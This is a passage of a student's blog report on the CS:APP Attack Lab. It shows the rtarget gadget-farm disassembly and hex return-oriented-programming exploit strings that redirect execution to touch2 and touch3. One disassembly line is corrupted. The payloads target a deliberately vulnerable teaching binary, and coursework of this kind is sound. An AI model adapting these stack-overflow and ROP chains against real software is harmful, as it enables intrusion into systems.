+<p>可知需要触发 touch2 且同时将 cookie 作为 unsigned 类型的参数传入，方可通过。</p>
+</li>
+<li><p>将 rtarget 反汇编：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.txt</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>观察其中的 gadgets，根据需求寻找合适代码段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">0000000000401e3b &lt;start_farm&gt;:</span><br><span class="line">  401e3b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e3f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401e44:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e45 &lt;getval_349&gt;:</span><br><span class="line">  401e45:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e49:	b8 48 89 c7 c7       	mov    $0xc7c78948,%eax</span><br><span class="line">  401e4e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e4f &lt;setval_341&gt;:</span><br><span class="line">  401e4f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e53:	c7 07 d8 90 90 c3    	movl   $0xc39090d8,(%rdi)</span><br><span class="line">  401e59:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e5a &lt;getval_262&gt;:</span><br><span class="line">  401e5a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e5e:	b8 58 90 c3 9a       	mov    $0x9ac39058,%eax</span><br><span class="line">  401e63:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e64 &lt;getval_167&gt;:</span><br><span class="line">  401e64:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e68:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax</span><br><span class="line">  401e6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e6e &lt;addval_458&gt;:</span><br><span class="line">  401e6e:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e72:	8d 87 4a 89 c7 90    	lea    -0x6f3876b6(%rdi),%eax</span><br><span class="line">  401e78:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e79 &lt;getval_435&gt;:</span><br><span class="line">  401e79:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e7d:	b8 58 90 90 c3       	mov    $0xc3909058,%eax</span><br><span class="line">  401e82:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e83 &lt;getval_455&gt;:</span><br><span class="line">  401e83:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e87:	b8 58 90 c1 b6       	mov    $0xb6c19058,%eax</span><br><span class="line">  401e8c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e8d &lt;setval_232&gt;:</span><br><span class="line">  401e8d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e91:	c7 07 cb 48 89 c7    	movl   $0xc78948cb,(%rdi)</span><br><span class="line">  401e97:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401e98 &lt;mid_farm&gt;:</span><br><span class="line">  401e98:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e9c:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ea1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ea2 &lt;add_xy&gt;:</span><br><span class="line">  401ea2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ea6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  401eaa:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eab &lt;setval_424&gt;:</span><br><span class="line">  401eab:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eaf:	c7 07 8b d1 38 db    	movl   $0xdb38d18b,(%rdi)</span><br><span class="line">  401eb5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eb6 &lt;setval_260&gt;:</span><br><span class="line">  401eb6:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eba:	c7 07 81 ce 84 db    	movl   $0xdb84ce81,(%rdi)</span><br><span class="line">  401ec0:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ec1 &lt;getval_202&gt;:</span><br><span class="line">  401ec1:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ec5:	b8 81 c2 84 c0       	mov    $0xc084c281,%eax</span><br><span class="line">  401eca:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ecb &lt;getval_125&gt;:</span><br><span class="line">  401ecb:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ecf:	b8 f0 48 81 e0       	mov    $0xe08148f0,%eax</span><br><span class="line">  401ed4:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ed5 &lt;addval_475&gt;:</span><br><span class="line">  401ed5:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ed9:	8d 87 48 81 e0 c3    	lea    -0x3c1f7eb8(%rdi),%eax</span><br><span class="line">  401edf:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ee0 &lt;setval_432&gt;:</span><br><span class="line">  401ee0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ee4:	c7 07 88 c2 08 db    	movl   $0xdb08c288,(%rdi)</span><br><span class="line">  401eea:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401eeb &lt;setval_429&gt;:</span><br><span class="line">  401eeb:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eef:	c7 07 x c3    	movl   $0xc3e08948,(%rdi)</span><br><span class="line">  401ef5:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ef6 &lt;setval_165&gt;:</span><br><span class="line">  401ef6:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401efa:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)</span><br><span class="line">  401f00:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f01 &lt;addval_238&gt;:</span><br><span class="line">  401f01:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f05:	8d 87 89 ce 48 d2    	lea    -0x2db73177(%rdi),%eax</span><br><span class="line">  401f0b:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f0c &lt;setval_195&gt;:</span><br><span class="line">  401f0c:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f10:	c7 07 89 c2 30 d2    	movl   $0xd230c289,(%rdi)</span><br><span class="line">  401f16:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f17 &lt;addval_156&gt;:</span><br><span class="line">  401f17:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f1b:	8d 87 89 ce 91 c3    	lea    -0x3c6e3177(%rdi),%eax</span><br><span class="line">  401f21:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f22 &lt;setval_263&gt;:</span><br><span class="line">  401f22:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f26:	c7 07 c9 d1 84 db    	movl   $0xdb84d1c9,(%rdi)</span><br><span class="line">  401f2c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f2d &lt;getval_218&gt;:</span><br><span class="line">  401f2d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f31:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax</span><br><span class="line">  401f36:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f37 &lt;setval_305&gt;:</span><br><span class="line">  401f37:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f3b:	c7 07 88 c2 90 90    	movl   $0x9090c288,(%rdi)</span><br><span class="line">  401f41:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f42 &lt;addval_467&gt;:</span><br><span class="line">  401f42:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f46:	8d 87 48 99 e0 c3    	lea    -0x3c1f66b8(%rdi),%eax</span><br><span class="line">  401f4c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f4d &lt;setval_422&gt;:</span><br><span class="line">  401f4d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f51:	c7 07 df 81 c2 c3    	movl   $0xc3c281df,(%rdi)</span><br><span class="line">  401f57:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f58 &lt;getval_237&gt;:</span><br><span class="line">  401f58:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f5c:	b8 89 ce 08 c0       	mov    $0xc008ce89,%eax</span><br><span class="line">  401f61:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f62 &lt;addval_340&gt;:</span><br><span class="line">  401f62:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f66:	8d 87 48 88 e0 c3    	lea    -0x3c1f77b8(%rdi),%eax</span><br><span class="line">  401f6c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f6d &lt;addval_394&gt;:</span><br><span class="line">  401f6d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f71:	8d 87 89 c2 38 db    	lea    -0x24c73d77(%rdi),%eax</span><br><span class="line">  401f77:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f78 &lt;getval_388&gt;:</span><br><span class="line">  401f78:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f7c:	b8 89 ce 18 db       	mov    $0xdb18ce89,%eax</span><br><span class="line">  401f81:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f82 &lt;setval_368&gt;:</span><br><span class="line">  401f82:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f86:	c7 07 89 c2 84 db    	movl   $0xdb84c289,(%rdi)</span><br><span class="line">  401f8c:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f8d &lt;setval_131&gt;:</span><br><span class="line">  401f8d:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f91:	c7 07 89 d1 90 c3    	movl   $0xc390d189,(%rdi)</span><br><span class="line">  401f97:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401f98 &lt;addval_250&gt;:</span><br><span class="line">  401f98:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f9c:	8d 87 99 ce 84 c9    	lea    -0x367b3167(%rdi),%eax</span><br><span class="line">  401fa2:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fa3 &lt;getval_363&gt;:</span><br><span class="line">  401fa3:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fa7:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax</span><br><span class="line">  401fac:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fad &lt;addval_442&gt;:</span><br><span class="line">  401fad:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fb1:	8d 87 89 d1 48 c0    	lea    -0x3fb72e77(%rdi),%eax</span><br><span class="line">  401fb7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fb8 &lt;getval_313&gt;:</span><br><span class="line">  401fb8:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fbc:	b8 48 89 e0 90       	mov    $0x90e08948,%eax</span><br><span class="line">  401fc1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fc2 &lt;getval_244&gt;:</span><br><span class="line">  401fc2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fc6:	b8 17 38 8b d1       	mov    $0xd18b3817,%eax</span><br><span class="line">  401fcb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fcc &lt;setval_470&gt;:</span><br><span class="line">  401fcc:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fd0:	c7 07 89 d1 a4 c0    	movl   $0xc0a4d189,(%rdi)</span><br><span class="line">  401fd6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fd7 &lt;setval_452&gt;:</span><br><span class="line">  401fd7:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fdb:	c7 07 89 ce 00 db    	movl   $0xdb00ce89,(%rdi)</span><br><span class="line">  401fe1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fe2 &lt;addval_284&gt;:</span><br><span class="line">  401fe2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fe6:	8d 87 89 c2 30 c9    	lea    -0x36cf3d77(%rdi),%eax</span><br><span class="line">  401fec:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fed &lt;setval_116&gt;:</span><br><span class="line">  401fed:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ff1:	c7 07 89 ce 38 d2    	movl   $0xd238ce89,(%rdi)</span><br><span class="line">  401ff7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ff8 &lt;addval_214&gt;:</span><br><span class="line">  401ff8:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ffc:	8d 87 16 89 d1 91    	lea    -0x6e2e76ea(%rdi),%eax</span><br><span class="line">  402002:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402003 &lt;end_farm&gt;:</span><br><span class="line">  402003:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402007:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  40200c:	c3                   	retq   </span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>最终填入字符串如下：（# 后的为注释）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">5f 1e 40 00 00 00 00 00 # pop %rax</span><br><span class="line">c8 9e d9 23 00 00 00 00 # cookie</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">71 1c 40 00 00 00 00 00 # touch2</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>最后用栈的分配图来示意：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/attack-lab.assets/stack4.png"
+                      alt="stack4"
+                ></p>
+</li>
+</ul>
+<h4 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3:"></a>Level 3:</h4><ul>
+<li><p>再次观察所给出代码：</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可知需要触发 touch3 且同时将 cookie 作为 char[] 类型的参数传入，方可通过</p>
+</li>
+<li><p>将 cookie 转为16进制的 ascii 码表示：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32 33 64 39 39 65 63 38 00 # 由于是字符串，结尾需要用 &#x27;\0&#x27; 标记</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>和 Level 2 类似的，由于栈的随机化，不能直接将代码插入绝对地址中，可以以 %rsp 为基准进行插入</p>
+</li>
+<li><p>和此前类似的，为了避免数据的覆盖，跳转的内存地址应该存入在返回地址的更高位处</p>
+</li>
+<li><p>最终填入字符串如下：（# 后的为注释）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f1 1e 40 00 00 00 00 00 # movq %rsp,%rax</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">5f 1e 40 00 00 00 00 00 # pop rax</span><br><span class="line">48 00 00 00 00 00 00 00 # bias</span><br><span class="line">73 1f 40 00 00 00 00 00 # movl %eax,%edx  compb %bl,%bl</span><br><span class="line">93 1f 40 00 00 00 00 00 # movl %edx,%ecx</span><br><span class="line">f3 1f 40 00 00 00 00 00 # movl %ecs,%esi</span><br><span class="line">a6 1e 40 00 00 00 00 00 # lea (%rdi,%rsi,1),%rax</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">96 1d 40 00 00 00 00 00 # touch3</span><br><span class="line">32 33 64 39 39 65 63 38 00 # cookie</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>栈的分布以及由上面的字符串注释和 Level 2 的示意可以较为清楚地得知，因此略去。</p>
+</li>
+</ul>
+<h2 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h2><ul>
+<li>学会了使用 objdump 工具</li>
+<li>对如何写一个安全的程序有了更深刻的理解</li>
+</ul>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Attack Lab Report</li>
+        <li>Post author：johnnycake</li>
+        <li>Create time：2023-01-19 23:00:02</li>
+        <li>
+            Post link：https://fleurs03.github.io/2023/01/19/attack-lab/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ics/">#ics</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/homework/">#homework</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/01/19/malloc-lab/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">Malloc Lab Report</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/01/19/coroutine/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">Coroutine Lab Report</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84%EF%BC%9A"><span class="nav-text">实验目的：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-text">实验内容：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-text">实验原理：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-Injection-Attacks%EF%BC%9A"><span class="nav-text">Code Injection Attacks：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="nav-text">实验原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-1"><span class="nav-text">Level 1:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2"><span class="nav-text">Level 2:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3"><span class="nav-text">Level 3:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Return-Oriented-Programming"><span class="nav-text">Return-Oriented Programming:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86%EF%BC%9A-2"><span class="nav-text">实验原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-2-1"><span class="nav-text">Level 2:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level-3-1"><span class="nav-text">Level 3:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%94%B6%E8%8E%B7"><span class="nav-text">实验收获</span></a></li></ol>
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">johnnycake. All Rights Reserved.</a>
+        </div>
+        
